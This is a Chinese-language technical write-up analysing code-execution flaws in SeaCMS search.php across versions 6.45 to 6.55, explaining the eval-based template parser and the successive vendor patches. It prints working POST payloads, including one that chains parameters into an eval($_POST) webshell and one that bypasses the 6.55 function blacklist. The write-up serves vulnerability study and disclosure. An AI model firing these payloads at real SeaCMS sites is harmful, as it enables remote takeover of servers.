seacms 的search.php 在v6.45,v6.54,v6.55 都爆出过代码执行漏洞，而且是在同一个地方即对if标签解析上面过滤不严导致的代码执行漏洞， 该漏洞本身也特别有意思，因此自己好好总结了一番


### v6.45的代码执行漏洞分析

代码执行部分在/include/main.class.php文件的parseIf函数中
```php
function parseIf($content){
    if (strpos($content,'{if:')=== false){
    return $content;
    }else{
    $labelRule = buildregx("{if:(.*?)}(.*?){end if}","is");
    $labelRule2="{elseif";
    $labelRule3="{else}";
    preg_match_all($labelRule,$content,$iar);
    $arlen=count($iar[0]);
    $elseIfFlag=false;
    for($m=0;$m<$arlen;$m++){
            $strIf=$iar[1][$m];
            $strIf=$this->parseStrIf($strIf);
            $strThen=$iar[2][$m];
            $strThen=$this->parseSubIf($strThen);
            if (strpos($strThen,$labelRule2)===false){
                    if (strpos($strThen,$labelRule3)>=0){
                            $elsearray=explode($labelRule3,$strThen);
                            $strThen1=$elsearray[0];
                            $strElse1=$elsearray[1];
                            @eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
                            if ($ifFlag){ $content=str_replace($iar[0][$m],$strThen1,$content);} else {$content=str_replace($iar[0][$m],$strElse1,$content);}
                    }else{
                    @eval("if(".$strIf.") { \$ifFlag=true;} else{ \$ifFlag=false;}");
                    if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],"",$content);}
            }else{
                    $elseIfArray=explode($labelRule2,$strThen);
                    $elseIfArrayLen=count($elseIfArray);
                    $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);
                    $resultStr=$elseIfSubArray[1];
                    $elseIfArraystr0=addslashes($elseIfArray[0]);
                    @eval("if($strIf){\$resultStr=\"$elseIfArraystr0\";}");
                    for($elseIfLen=1;$elseIfLen<$elseIfArrayLen;$elseIfLen++){
                            $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],":","}","");
                            $strElseIf=$this->parseStrIf($strElseIf);
                            $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],"}","","start"));
                            @eval("if(".$strElseIf."){\$resultStr=\"$strElseIfThen\";}");
                            @eval("if(".$strElseIf."){\$elseIfFlag=true;}else{\$elseIfFlag=false;}");
                            if ($elseIfFlag) {break;}
                    }
                    $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],":","}","");
                    $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],"}","","start"));
                    if(strpos($strElseIf0,'==')===false&&strpos($strElseIf0,'=')>0)$strElseIf0=str_replace('=', '==', $strElseIf0);
                    @eval("if(".$strElseIf0."){\$resultStr=\"$strElseIfThen0\";\$elseIfFlag=true;}");
                    $content=str_replace($iar[0][$m],$resultStr,$content);
            }
    }
    return $content;
    }
    }
```

上面主要逻辑是解析{if:}{end if}标签代码，把if语句的条件判断部分取出来然后用eval函数去执行， 这个漏洞点在于在这个过程中没有做任何处理，直接用eval函数去处理， 我们去找找调用这个函数的地方


在search.php 中的echoSearchPage()函数可以触发漏洞

```php
function echoSearchPage()
{
    global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;
    $order = !empty($order)?$order:time;
 ...
 ...
 ...
    $content = str_replace("{searchpage:page}",$page,$content);
    $content = str_replace("{seacms:searchword}",$searchword,$content);
    $content = str_replace("{seacms:searchnum}",$TotalResult,$content);
    $content = str_replace("{searchpage:ordername}",$order,$content);
 ...
 ...
 ...
    $content=replaceCurrentTypeId($content,-444);
    $content=$mainClassObj->parseIf($content);
```

order 这个变量可以通过变量覆盖来传入，没有任何过滤，之后用order变量替换了模板中的`{searchpage:ordername}` 

    $content = str_replace("{searchpage:ordername}",$order,$content);
    
我们提交我们post的数据：

    searchword=d&order=}{end if}{if:1)phpinfo();if(1}{end if}
    
替换后的模板的html代码如下:

```php
<a href="{searchpage:order-time-link}" {if:"}{end if}{if:1)phpinfo();if(1}{end if}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">最新上映</a>
<a href="{searchpage:order-hit-link}" {if:"}{end if}{if:1)phpinfo();if(1}{end if}"=="hit"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderaddtime">最近热播</a>
<a href="{searchpage:order-score-link}" {if:"}{end if}{if:1)phpinfo();if(1}{end if}"=="score"} class="btn btn-success" {else} class="btn btn-default" {end if} id="ordergold">评分最高</a>
```

然后经过parseIf函数的解析，将{if:}{end if}的条件判断语句提取出来，即`1)phpinfo();if(1` , 正则语句为` $labelRule = buildregx("{if:(.*?)}(.*?){end if}","is");`

eval 函数字符拼接后最终执行的代码是:

    evil("if(1)phpinfo();if(1){\$ifFlag=true;}else{\$ifFlag=false;}");


### v6.54 版本代码注入
之后官方修复了这一漏洞，修复方式是这样的:

```php
$orderarr=array('id','idasc','time','timeasc','hit','hitasc','commend','commendasc','score','scoreasc');
if(!(in_array($order,$orderarr))){$order='time';}
```

这个时候官方修复的方法是将order参数设置了一个白名单，这样就无法通过order 参数注入代码， 然而，通过之前的分析我们知道，漏洞产生的问题是在于parseIf函数中的参数没有经过过滤直接拼接后用eval执行，so ,漏洞再次产生，还是在search.php文件中，但攻击payload不再order参数这里，而在前面的参数中：

```php
$searchword = RemoveXSS(stripslashes($searchword));
$searchword = addslashes(cn_substr($searchword,20));
$searchword = trim($searchword);

$jq = RemoveXSS(stripslashes($jq));
$jq = addslashes(cn_substr($jq,20));

$area = RemoveXSS(stripslashes($area));
$area = addslashes(cn_substr($area,20));

$year = RemoveXSS(stripslashes($year));
$year = addslashes(cn_substr($year,20));

$yuyan = RemoveXSS(stripslashes($yuyan));
$yuyan = addslashes(cn_substr($yuyan,20));

$letter = RemoveXSS(stripslashes($letter));
$letter = addslashes(cn_substr($letter,20));

$state = RemoveXSS(stripslashes($state));
$state = addslashes(cn_substr($state,20));

$ver = RemoveXSS(stripslashes($ver));
$ver = addslashes(cn_substr($ver,20));

$money = RemoveXSS(stripslashes($money));
$money = addslashes(cn_substr($money,20));
```

这些参数也可以通过变量覆盖的方式传入，然后这些参数还用了removeXSS,addslashes函数去过滤，而且截取了前20个字节，即每个参数只能传入20个字节长度的限制，构造的poc也是特别巧妙，来看下大佬们构造的poc

```
searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();
```

在search.php的echoSearchPage函数中的代码大概这样:

```php
function echoSearchPage()
{
...
	$content = str_replace("{searchpage:page}",$page,$content);
	$content = str_replace("{seacms:searchword}",$searchword,$content);
	$content = str_replace("{seacms:searchnum}",$TotalResult,$content);
	$content = str_replace("{searchpage:ordername}",$order,$content);
...

	$content = str_replace("{searchpage:type}",$tid,$content);
	$content = str_replace("{searchpage:typename}",$tname ,$content);
	$content = str_replace("{searchpage:year}",$year,$content);
	$content = str_replace("{searchpage:area}",$area,$content);
	$content = str_replace("{searchpage:letter}",$letter,$content);
	$content = str_replace("{searchpage:lang}",$yuyan,$content);
	$content = str_replace("{searchpage:jq}",$jq,$content);
	if($state=='w'){$state2="完结";}elseif($state=='l'){$state2="连载中";}else{$state2="全部";}
	if($money=='m'){$money2="免费";}elseif($money=='s'){$money2="收费";}else{$money2="全部";}
	$content = str_replace("{searchpage:state}",$state2,$content);
	$content = str_replace("{searchpage:money}",$money2,$content);
	$content = str_replace("{searchpage:ver}",$ver,$content);
		
...
	$content=replaceCurrentTypeId($content,-444);
	$content=$mainClassObj->parseIf($content);
```

这里利用了对searchpage标签重复替换的方法插入我们的payload

原来模板中的html代码如下:
```php
<meta name="keywords" content="{seacms:searchword},海洋CMS" />

```

第一次替换`{seacms:searchword}` 后的html代码为:

    <meta name="keywords" content="{if{searchpage:year},海洋CMS" />

之后依次替换的内容为:

```php
//替换year
<meta name="keywords" content="{if:e{searchpage:area}},海洋CMS" />

//替换area
<meta name="keywords" content="{if:ev{searchpage:letter}},海洋CMS" />

//替换letter
<meta name="keywords" content="{if:eval{searchpage:lang}},海洋CMS" />

//替换lang
<meta name="keywords" content="{if:eval(join{searchpage:jq}},海洋CMS" />

//替换jq
<meta name="keywords" content="{if:eval(join($_P{searchpage:ver}},海洋CMS" />

//替换ver
<meta name="keywords" content="{if:eval(join($_POST[9]))},海洋CMS" />
```

这样就拼好了我们的一句话木马了, 之后被$labelRule正则解析出来的代码为:`eval(join($_POST[9]))`

最终我们eval执行的语句是:

    @eval("if(eval(join($_POST[9]))){\$ifFlag=true;}else{\$ifFlag=false;}");
    
### v6.55 代码执行

在这个版本中，开发人员终于发现了这个问题的本质，于是在这个版本中添加了一个修复方案:

```php
foreach($iar as $v){
    $iarok[] = str_ireplace(array('unlink','opendir','mysqli_','mysql_','socket_','curl_','base64_','putenv','popen(','phpinfo','pfsockopen','proc_','preg_','_GET','_POST','_COOKIE','_REQUEST','_SESSION','_SERVER','assert','eval(','file_','passthru(','exec(','system(','shell_'), '@.@', $v);
}
$iar = $iarok;  
```

很明显的黑名单过滤，只是简单得过滤了下常用的危险命令， 但因为前面参数还有addshalshes函数和remoteXSS函数的过滤，导致这里不太好利用， freebuf上面已经有大佬公布了利用方式，利用$_SERVER变量任意代码执行，具体细节看参考链接,这里我只是执行一个简单的输出命令来证实一下代码执行漏洞,

poc如下:


    searchtype=5&searchword={if{searchpage:year}&year=:p{searchpage:area}}&area=r{searchpage:letter}&letter=int{searchpage:lang}&yuyan=_r({searchpage:jq}&jq={searchpage:ver}&&ver=$GLOBALS)
    
最后代码执行的是print_r($GLOBALS)函数，成功打印出了$GLOBALS参数的值.

### v6.56 

该版本除了黑名单还在search.php中添加了如下一句话:

```php
//感谢freebuf文章作者天择实习生（椒图科技天择实验室）的漏洞报告
if(strpos($searchword,'{searchpage:')) exit; 
```

这样，就让searchpage标签的替换都失效了，个人认为这种修复方法也不是很好，但目前没有找到可利用的其他标签， 该版本目前暂时解决了代码执行漏洞的问题

参考：
http://www.freebuf.com/vuls/150042.html
http://www.freebuf.com/vuls/150303.html
https://www.seebug.org/vuldb/ssvid-92744